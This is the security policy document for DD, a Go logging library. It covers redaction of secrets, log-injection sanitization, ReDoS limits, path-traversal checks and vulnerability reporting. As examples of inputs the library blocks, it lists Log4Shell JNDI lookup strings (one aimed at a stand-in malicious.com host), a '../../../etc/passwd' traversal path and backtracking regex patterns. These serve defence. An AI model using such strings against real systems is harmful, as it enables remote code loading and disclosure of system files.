# Security Policy

## ⚠️ IMPORTANT: Security Configuration

**Basic sensitive data filtering is ENABLED by default** in every preset
(`DefaultConfig()`, `DevelopmentConfig()`, `JSONConfig()`). Passwords, API keys,
credit cards, and other common sensitive data are redacted out of the box — no
extra configuration is required.

### Choosing a Filtering Level

```go
// Default — basic filtering is already on (DefaultSecurityConfig())
cfg := dd.DefaultConfig()
logger, _ := dd.New(cfg)

// Option 1: Full filtering (emails, IPs, JWTs, ... — maximum coverage)
cfg := dd.DefaultConfig()
cfg.Security = dd.DefaultSecureConfig()
logger, _ := dd.New(cfg)

// Option 2: Industry-specific presets
cfg := dd.DefaultConfig()
cfg.Security = dd.HealthcareConfig()   // HIPAA compliance
// OR
cfg.Security = dd.FinancialConfig()    // PCI-DSS compliance
// OR
cfg.Security = dd.GovernmentConfig()   // Government/defense systems
logger, _ := dd.New(cfg)

// Option 3: Explicitly DISABLE filtering (development only — max performance)
cfg := dd.DefaultConfig()
cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelDevelopment)
logger, _ := dd.New(cfg)
```

### Risk Assessment

| Configuration | Risk Level | Use Case |
|---------------|------------|----------|
| `DefaultSecurityConfig()` (default) | **MEDIUM** | General production |
| `DefaultSecureConfig()` | **LOW** | High-security environments |
| Industry presets | **LOW** | Compliance requirements |
| `SecurityLevelDevelopment` (no filtering) | **HIGH** | Local development only |

**Never disable filtering in production systems that handle sensitive data.**

---

## Overview

The DD logging library is designed with security as a core principle. This document outlines the security features, best practices, and vulnerability reporting procedures for the DD library.

## Security Features

### 1. Sensitive Data Filtering

DD provides built-in protection against accidental logging of sensitive information through configurable pattern-based filtering.

#### Default Behavior

**Basic sensitive data filtering is ENABLED by default** (via `DefaultSecurityConfig()`) in every preset. Users can upgrade to full filtering or disable filtering entirely when needed.

#### Filtering Levels

**Basic Filtering** (default; `DefaultSecurityConfig()`):
- Credit card numbers (13-19 digits)
- Social Security Numbers (SSN format: XXX-XX-XXXX)
- Password fields (password/passwd/pwd with values)
- API keys and tokens, including AWS access keys (AKIA/ASIA) and OpenAI keys (sk-*)
- GitHub, Slack, Stripe, Azure, and GCP service-account tokens
- Private key headers (PEM format)
- Phone numbers (multiple formats)
- Database connection strings

**Full Filtering** (`DefaultSecureConfig()` — all basic patterns, plus):
- JWT tokens (eyJ* format)
- Google API keys (AIza* format)
- Email addresses
- IPv4 and IPv6 addresses
- JDBC connection strings
- Server/data source patterns

**Enterprise Patterns** (available in full filtering and industry presets):
- **Financial Services**: SWIFT/BIC codes, IBAN, CVV/CVC codes
- **Healthcare**: ICD-10 codes, NPI, MRN, HICN
- **Government**: Passport numbers, Driver's License, Tax ID/EIN, UK NI, Canadian SIN
- **Cloud Providers**: GitHub tokens, Slack tokens, Stripe keys, GCP service accounts, Azure connection strings

#### Usage Examples

```go
// Basic filtering is enabled by default (DefaultSecurityConfig()).
// For full filtering (emails, IPs, JWTs, ...):
config := dd.DefaultConfig()
config.Security = dd.DefaultSecureConfig()
logger, _ := dd.New(config)

// Custom filtering patterns
filter := dd.NewEmptySensitiveDataFilter()
filter.AddPattern(`(?i)internal[_-]?token[:\s=]+[^\s]+`)
filter.AddPattern(`\bSECRET_[A-Z0-9_]+\b`)
config := dd.DefaultConfig()
config.Security = &dd.SecurityConfig{
    SensitiveFilter: filter,
}
logger, _ := dd.New(config)
```

#### Field-Level Filtering

The library automatically redacts values for fields with sensitive key names:

```go
logger.InfoWith("User data",
    dd.String("password", "secret123"),      // → password=[REDACTED]
    dd.String("api_key", "sk-1234567890"),   // → api_key=[REDACTED]
    dd.String("token", "abc123xyz"),         // → token=[REDACTED]
    dd.String("username", "john_doe"),       // → username=john_doe (not filtered)
)
```

Sensitive keywords detected:
- password, passwd, pwd
- secret, token
- api_key, apikey, api-key
- access_key, accesskey, access-key
- secret_key, secretkey, secret-key
- private_key, privatekey, private-key
- auth, authorization
- credit_card, creditcard
- ssn, social_security

### 2. Injection Attack Prevention

DD automatically protects against log injection attacks through message sanitization.

#### Always-Enabled Protections

**Newline Escaping**: Prevents log injection by escaping newline characters
```go
logger.Info("User input: \nmalicious\nlog\nentry")
// Output: User input: \nmalicious\nlog\nentry
```

**Control Character Filtering**: Removes dangerous control characters (except tab)
- Filters characters < 32 (except \t)
- Filters character 127 (DEL)
- Preserves UTF-8 characters (≥ 128)

**ANSI Escape Sequence Removal**: Strips all ANSI escape sequences
- CSI (Control Sequence Introducer): Colors, cursor movement
- OSC (Operating System Command): Window titles, hyperlinks
- DCS (Device Control String): Device control data
- APC (Application Program Command): Application-specific data
- PM (Privacy Message): Privacy messages
- SOS (Start of String): String delimiters

**Unicode Control Character Removal**: Removes invisible Unicode characters that can be used for log injection or obfuscation
- Zero Width Space (ZWSP, U+200B)
- Zero Width Non-Joiner (ZWNJ, U+200C)
- Zero Width Joiner (ZWJ, U+200D)
- Left-to-Right/Right-to-Left Marks (U+200E, U+200F)
- Line/Paragraph Separators (U+2028, U+2029)
- Bidirectional Formatting (U+202A-U+202E)
- Byte Order Mark (BOM, U+FEFF)

**Message Size Limiting**: Prevents memory exhaustion attacks
```go
config := dd.DefaultConfig()
config.Security.MaxMessageSize = 5 * 1024 * 1024 // Default: 5MB
```

Messages exceeding the limit are truncated in place at a UTF-8 rune boundary
and an ellipsis (`...`) is appended, so the written line never exceeds the limit.

### 3. ReDoS (Regular Expression Denial of Service) Protection

The sensitive data filter includes multiple layers of protection against ReDoS attacks:

#### Timeout Protection

Each regex operation has a timeout: a 50ms base that scales with input length
(+4x base per 32KB above 32KB), so large legitimate messages are not falsely
discarded:
```go
filter := dd.NewSensitiveDataFilter()
// Timeout is automatically applied to prevent hanging
result := filter.Filter(potentiallyMaliciousInput)
```

If a regex operation exceeds the timeout, the caller abandons the scan and the
input is returned as `[REDACTED]` (fail closed).

#### Input Length Limiting

Filters enforce a maximum input length to prevent catastrophic backtracking:
- All filters (default, basic, and empty): 256KB max input

Inputs exceeding the limit are truncated with `... [TRUNCATED FOR SECURITY]` suffix.

#### Pattern Validation

Custom patterns are validated for ReDoS vulnerability:
```go
filter := dd.NewEmptySensitiveDataFilter()
err := filter.AddPattern("(a+)+") // Returns ErrReDoSPattern
```

Detected dangerous patterns:
- Nested quantifiers: `(a+)+`, `(a*)*`, `(a+)*`
- Overlapping alternatives: `(a|a)+`
- Excessive quantifier ranges: `a{1,1000000}`

#### Panic Recovery

The filter includes panic recovery to handle regex engine crashes:
```go
// If regex panics, returns: [REDACTED]
```

### 4. Resource Exhaustion Protection

#### Writer Count Limiting

Prevents resource exhaustion via a fixed package cap of 100 writers, enforced
in `Config.Validate` and `Logger.AddWriter`:
```go
// New() with more than 100 targets fails validation
config := dd.DefaultConfig()
config.Targets = targets // len(targets) > 100
_, err := dd.New(config) // Returns ErrMaxWritersExceeded

// The same fixed cap applies to writers added at runtime
err = logger.AddWriter(newWriter) // Returns ErrMaxWritersExceeded beyond 100
```

Note: `SecurityConfig.MaxWriters` is informational only — configuring a lower
value does not lower the enforced cap.

#### Field Key Validation

Field key validation is **opt-in** (disabled by default). When enabled via
`Config.FieldValidation`, keys are checked for injection risks and naming
convention; invalid keys produce a validation error that is **logged** — keys
are not silently rewritten.

- Maximum key length: 256 characters
- Allowed characters: a-z, A-Z, 0-9, _, -, .
- Cannot start with a digit
- Blocks path traversal (`..`), null bytes, Log4Shell, overlong UTF-8, and
  homograph (mixed-script) attacks

```go
cfg := dd.DefaultConfig()
cfg.FieldValidation = dd.StrictSnakeCaseConfig() // enable strict validation

// With validation on, an invalid key is reported (not rewritten):
//   dd.String("invalid key!", "value")  // → validation error logged
```

#### Concurrency Limits

The filter uses a semaphore to limit concurrent regex operations:
```go
const maxConcurrentFilters = 100
```

### 5. Path Traversal Protection

File writers automatically validate paths to prevent directory traversal attacks:
```go
// Safe: Creates file in logs directory
fileWriter, _ := dd.NewFileWriter("logs/app.log", dd.FileWriterConfig{})

// Protected: Path traversal attempts are blocked
fileWriter, _ := dd.NewFileWriter("../../../etc/passwd", dd.FileWriterConfig{}) // Returns error
```

#### Symlink and Hardlink Protection

After opening a log file, the library validates the file handle to detect and prevent symlink and hardlink attacks:

- **Symlink Detection**: Files that are symbolic links are rejected to prevent attackers from redirecting log output to sensitive files.
- **Hardlink Detection**: Files with multiple hard links are rejected to prevent attackers from accessing log content through alternative paths.
- **TOCTOU Prevention**: Validation is performed on the opened file handle (not the path) to prevent time-of-check-time-of-use vulnerabilities.

#### UTF-8 Overlong Encoding Detection

The library detects UTF-8 overlong encoding attacks, which can be used to bypass path traversal checks:
```go
// These attacks are blocked:
// - 0xC0 0xAE represents '.' (overlong encoding)
// - 0xC0 0xAF represents '/' (overlong encoding)
// - 0xE0 0x80 0xAF represents '/' (3-byte overlong)
```

### 6. Secure Memory Handling

The library prevents sensitive log content from lingering in pooled memory.
This is entirely internal — callers benefit automatically and do not (and
cannot) use it directly.

#### Pool Buffer Zeroing

Every pool that can carry log content zeroes its buffers before returning
them (buffers that grew oversized are zeroed and discarded instead of pooled):

- Log line buffers (text and JSON output lines)
- Argument-formatting and sanitization buffers
- JSON encoder buffers and audit encoder buffers
- Debug output buffers
- HMAC signing data and signature buffers (integrity signer)

Map pools (JSON entry/field maps, recursive-filter visited maps) are
`clear()`ed before reuse. `NewIntegritySigner` additionally zeros its copy of
the configured `SecretKey` (documented in its godoc).

### 7. Thread Safety

All public methods are fully concurrent-safe:
- Atomic operations for hot paths (level checks, state management)
- RWMutex for writer management (infrequent operations)
- Lock-free design for logging operations
- Runtime reconfiguration is supported and safe: SetLevel, SetSecurityConfig,
  AddWriter/RemoveWriter, hooks, and context extractors can all be changed
  while other goroutines are logging

```go
// Safe for concurrent use
var wg sync.WaitGroup
for i := 0; i < 100; i++ {
    wg.Add(1)
    go func() {
        defer wg.Done()
        logger.Info("Concurrent logging")
    }()
}
wg.Wait()
```

#### Atomic Cache Operations

Caches use concurrent-safe primitives:
- `sync.Map` for the caller cache (bounded at 10,000 entries) and the
  sensitive-field-key result cache (bounded at 8,192 entries)
- `atomic.Pointer` for the per-second time-format cache (layouts with
  sub-second precision bypass it to avoid stale fractional digits)
- Atomic counters with CAS updates for cache size limiting

### 8. Audit Logging

DD provides comprehensive audit logging for security monitoring:

#### Audit Event Types

| Event Type | Description | Severity | Emitted by |
|------------|-------------|----------|------------|
| `SENSITIVE_DATA_REDACTED` | Sensitive data was filtered | Info | Logger, automatically on each redaction |
| `RATE_LIMIT_EXCEEDED` | Rate limit triggered | Warning | Logger, automatically when the rate limiter drops a message |
| `REDOS_ATTEMPT` | Potential ReDoS pattern detected | Critical | `AuditLogger.LogReDoSAttempt` (caller-invoked) |
| `SECURITY_VIOLATION` | General security violation | Error | `AuditLogger.LogSecurityViolation` (caller-invoked) |
| `INTEGRITY_VIOLATION` | Log integrity check failed | Critical | `AuditLogger.LogIntegrityViolation` (caller-invoked) |
| `PATH_TRAVERSAL_ATTEMPT` | Path traversal detected | Critical | `AuditLogger.LogPathTraversalAttempt` (caller-invoked) |

The `INPUT_SANITIZED`, `LOG4SHELL_ATTEMPT`, `NULL_BYTE_INJECTION`,
`OVERLONG_ENCODING`, and `HOMOGRAPH_ATTACK` event type constants exist, but no
library code path emits them today — they are reserved for applications that
perform their own detection and log events via `AuditLogger.Log`. (Log4Shell,
null-byte, overlong-encoding, and homograph payloads are blocked at their
respective validation layers — see sections 2 and 5 — without audit events.)

#### Usage

```go
// Configure audit logging
auditConfig := dd.DefaultAuditConfig()
auditConfig.Output = auditFile // *os.File; nil = events are accepted and
                               // counted (Stats) but produce no output
auditConfig.JSONFormat = true

// Attach to the main logger via Config.Audit (*AuditConfig).
// The Logger builds and manages the AuditLogger internally.
config := dd.DefaultConfig()
config.Audit = &auditConfig
logger, _ := dd.New(config)
```

### 9. Log4Shell Protection

DD detects and blocks Log4Shell (CVE-2021-44228) attack patterns:

```go
// These patterns are blocked:
// - ${jndi:ldap://malicious.com/a}
// - ${${lower:j}ndi:ldap://...}
// - ${${::-j}${::-n}${::-d}${::-i}:...}
// - Unicode escapes: \u006a\u006e\u0064\u0069
```

### 10. Cache Security

#### Cache Size Limits

All caches have size limits to prevent memory exhaustion:
- Caller cache: 10,000 entries max
- Sensitive-field-key result cache: 8,192 entries max
- Filter result cache: 1,000 entries max (only inputs ≤ 64 bytes are cached)

#### Cache TTL

Filter results have a 5-minute TTL with 1ms safety margin:
```go
const cacheTTLSeconds = 300
ttlWithMargin := time.Duration(cacheTTLSeconds)*time.Second - time.Millisecond
```

#### Hash Collision Protection

Filter cache uses both hash and input verification:
```go
if entry, ok := f.cache[inputHash]; ok && len(entry.input) == inputLen && entry.input == input {
    // Use cached result
}
```

---

## Security Best Practices

### 1. Enable Filtering for Sensitive Data

Basic filtering is enabled by default. Upgrade to full filtering when logging
user input or potentially sensitive data:

```go
cfg := dd.DefaultConfig()
cfg.Level = dd.LevelInfo
cfg.Format = dd.FormatJSON
cfg.Security = dd.DefaultSecureConfig() // full filtering
target := dd.FileOutput("logs/app.log")
target.MaxSizeMB = 100
target.MaxBackups = 30
target.Compress = true
cfg.Targets = []dd.OutputTarget{target}
logger, _ := dd.New(cfg)
defer logger.Close()
```

### 2. Validate User Input Before Logging

Never log raw user input without validation:

```go
// ❌ Bad: Direct logging of user input
logger.Info(userInput)

// ✅ Good: Validate and use structured logging
if len(userInput) > 1000 {
    userInput = userInput[:1000]
}
logger.InfoWith("User action",
    dd.String("action", sanitize(userInput)),
    dd.String("user_id", userID),
)
```

### 3. Use Structured Logging for Sensitive Fields

Use structured logging with field-level filtering:

```go
// ✅ Recommended: Field-level filtering
logger.InfoWith("Authentication",
    dd.String("username", username),
    dd.String("password", password), // Automatically redacted
    dd.String("ip", clientIP),
)

// ❌ Not recommended: String concatenation
logger.Info(fmt.Sprintf("Auth: %s:%s from %s", username, password, clientIP))
```

### 4. Configure Appropriate Message Size Limits

Set message size limits based on your application's needs:

```go
config := dd.DefaultConfig()
config.Security.MaxMessageSize = 1 * 1024 * 1024 // 1MB for high-security environments
config.Security.RateLimitConfig = dd.DefaultRateLimitConfig() // flood protection
```

### 5. Secure File Permissions

When logging to files, ensure appropriate file permissions:

```go
// Set restrictive permissions on log files
fileWriter, _ := dd.NewFileWriter("logs/app.log", dd.FileWriterConfig{
    // File is created with 0600 permissions by default
    // Adjust OS-level permissions as needed
})
```

### 6. Rotate and Compress Logs

Enable log rotation and compression to prevent disk exhaustion:

```go
target := dd.FileOutput("logs/app.log")
target.MaxSizeMB = 100                 // Rotate at 100MB
target.MaxBackups = 10                 // Keep only 10 backups
target.MaxAge = 7 * 24 * time.Hour     // Delete after 7 days
target.Compress = true                 // Compress old logs
cfg := dd.DefaultConfig()
cfg.Targets = []dd.OutputTarget{target}
logger, _ := dd.New(cfg)
```

### 7. Handle Fatal Logs Carefully

Fatal logs terminate the application - use with caution:

```go
// Custom fatal handler for graceful shutdown
config := dd.DefaultConfig()
config.FatalHandler = func() {
    // Cleanup resources
    cleanup()
    // Custom exit code
    os.Exit(2)
}
logger, _ := dd.New(config)

// Only use Fatal for truly unrecoverable errors
logger.Fatal("Critical system failure")
```

### 8. Close Loggers Properly

Always close loggers to flush buffers and release resources:

```go
cfg := dd.DefaultConfig()
cfg.Targets = []dd.OutputTarget{dd.FileOutput("logs/app.log")}
logger, _ := dd.New(cfg)
defer logger.Close() // Ensures proper cleanup

// Or use explicit close with error handling
if err := logger.Close(); err != nil {
    fmt.Fprintf(os.Stderr, "Failed to close logger: %v\n", err)
}
```

For production environments, use the `Shutdown` method with a timeout for graceful shutdown:

```go
logger, _ := dd.New(dd.DefaultConfig())
defer func() {
    ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
    defer cancel()
    if err := logger.Shutdown(ctx); err != nil {
        fmt.Fprintf(os.Stderr, "Logger shutdown error: %v\n", err)
    }
}()
```

### 9. Monitor Hook Errors

Provide an error handler to monitor hook health in production. Hook errors are
delivered to a `HookErrorHandler` instead of panicking the logger:

```go
var hookErrors []error
var mu sync.Mutex

registry := dd.NewHooksFromConfig(dd.HooksConfig{
    ErrorHandler: func(event dd.HookEvent, hookCtx *dd.HookContext, err error) {
        mu.Lock()
        hookErrors = append(hookErrors, err)
        mu.Unlock()
    },
})

// Add hooks that may fail
registry.Add(dd.HookAfterLog, myUnreliableHook)

// Attach to logger via Config.Hooks
cfg := dd.DefaultConfig()
cfg.Hooks = registry
logger, _ := dd.New(cfg)

// Periodically drain and report errors
mu.Lock()
for _, err := range hookErrors {
    fmt.Fprintf(os.Stderr, "Hook error: %v\n", err)
}
hookErrors = hookErrors[:0]
mu.Unlock()
```

---

## Security Configuration Reference

### Minimal Security Configuration

```go
config := dd.DefaultConfig()
// Injection protection + basic sensitive-data filtering are always enabled.
// To disable filtering entirely for maximum performance:
config.Security = dd.SecurityConfigForLevel(dd.SecurityLevelDevelopment)
```

### Recommended Security Configuration

```go
config := dd.DefaultConfig()
// Basic filtering is already enabled by default (DefaultSecurityConfig())
config.Security.MaxMessageSize = 5 * 1024 * 1024 // 5MB
config.Security.RateLimitConfig = dd.DefaultRateLimitConfig() // 10k msg/s, 10MB/s
```

### Maximum Security Configuration

```go
config := dd.DefaultConfig()
config.Security = &dd.SecurityConfig{
    MaxMessageSize:  1 * 1024 * 1024, // 1MB
    SensitiveFilter: dd.NewSensitiveDataFilter(), // full filtering
    RateLimitConfig: dd.DefaultRateLimitConfig(), // flood protection
}
```

### Custom Security Configuration

```go
// Create custom filter with specific patterns
filter := dd.NewEmptySensitiveDataFilter()
filter.AddPattern(`(?i)internal[_-]?token[:\s=]+[^\s]+`)
filter.AddPattern(`\bCUSTOM_SECRET_[A-Z0-9]+\b`)

config := dd.DefaultConfig()
config.Security = &dd.SecurityConfig{
    MaxMessageSize:  2 * 1024 * 1024,
    SensitiveFilter: filter,
}
```

---

## Performance vs Security Trade-offs

| Feature               | Performance Impact | Security Benefit | Recommendation             |
|-----------------------|--------------------|------------------|----------------------------|
| No filtering          | None               | Low              | Development only           |
| Basic filtering       | ~5-10%             | Medium           | Recommended for production |
| Full filtering        | ~10-20%            | High             | High-security environments |
| Custom filtering      | Varies             | Varies           | Specific compliance needs  |
| Message size limiting | Minimal            | High             | Always enable              |
| Newline escaping      | Minimal            | High             | Always enabled             |
| Field key validation  | Minimal            | Medium           | Opt-in (disabled by default) |

---

## Internal Security Measures

### Memory Pool Security

All memory pools implement secure handling:

| Pool Type | Security Measure |
|-----------|-----------------|
| Log line buffers (text/JSON) | Zeroed before return; oversized buffers discarded |
| Argument & sanitize buffers | Zeroed before return |
| JSON / audit encoder buffers | Zeroed before return |
| Debug output buffers | Zeroed before return |
| HMAC sign data / signature buffers | Zeroed before return |
| Caller PC pool | PCs only, never log content |
| Map pools (JSON entry/field, filter visited) | clear() before return |

### Cache Consistency

All caches implement atomic operations:
- `sync.Map` for concurrent-safe storage
- `atomic.Int32` for size counters
- CAS loops for atomic updates
- Size limits enforced atomically

### Fast Path Security

Performance optimizations maintain security:
- Recursive value filtering is depth-limited (max depth 100) and element-count bounded
- JSON serialization is depth-limited to prevent recursive attacks (max depth 100)
- Time cache uses atomic operations for consistency
- All buffers zeroed before pool return

---

## Reporting a Vulnerability

If you discover a security vulnerability in the DD library, please report it responsibly:

1. **Do NOT** open a public GitHub issue
2. Email security reports to: cybergodev@gmail.com
3. Include:
   - Description of the vulnerability
   - Steps to reproduce
   - Potential impact
   - Suggested fix (if available)

### Response Timeline

| Stage | Timeline |
|-------|----------|
| Initial response | Within 48 hours |
| Vulnerability confirmation | Within 7 days |
| Fix development | Within 14 days (critical), 30 days (others) |
| Patch release | Within 24 hours of fix completion |

---

## Security Checklist

- [ ] Enable appropriate filtering level for your use case
- [ ] Configure message size limits
- [ ] Set up log rotation and retention policies
- [ ] Validate and sanitize user input before logging
- [ ] Use structured logging for sensitive data
- [ ] Implement proper file permissions on log files
- [ ] Close loggers properly to flush buffers
- [ ] Review logged data regularly for sensitive information
- [ ] Implement access controls on log files
- [ ] Consider encryption for logs at rest (external to DD)
- [ ] Monitor log file sizes and disk usage
- [ ] Test security configurations in staging environment
- [ ] Enable audit logging for security monitoring
- [ ] Configure rate limiting for high-traffic applications
- [ ] Use HTTPS/TLS for network log transport

---

## Additional Resources

- [README.md](README.md) - General documentation
- [examples/04_security.go](examples/04_security.go) - Security examples
- [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)

---

## Changelog

### Security Updates

| Version | Date | Description |
|---------|------|-------------|
| Latest | 2026-03-21 | Added buffer zeroing for JSON encoder pool |
| Latest | 2026-03-21 | Fixed time cache CAS retry consistency |
| Latest | 2026-03-21 | Fixed depth cache overflow handling |
| Latest | 2026-03-21 | Fixed filter cache TTL boundary condition |
| Latest | 2026-03-21 | Fixed map pool cleanup logic |
| Latest | 2026-03-21 | Added nil map handling in JSON fast path |

---

## License

This security policy is part of the DD logging library and is covered under the same MIT License.
